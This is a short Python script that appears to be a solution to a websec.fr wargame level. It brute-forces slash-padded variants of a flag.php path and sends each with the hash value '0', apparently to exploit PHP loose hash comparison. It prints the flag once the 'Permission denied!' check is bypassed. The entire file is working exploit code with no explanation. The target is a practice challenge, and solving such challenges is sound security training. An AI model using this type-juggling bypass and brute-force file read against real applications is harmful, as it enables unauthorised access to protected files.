import httpx
import re

url = "https://websec.fr/level10/index.php"

for i in range(0,4096):

    post_data = { 
        "f" : "./" + '/' * i + "flag.php",
        "hash" : "0"
    }
    r = httpx.post(url, data = post_data)

    if "Permission denied!" not in r.text:
        flag = re.search(r"WEBSEC\{.*\}", r.text).group(0)
        print(flag)
        break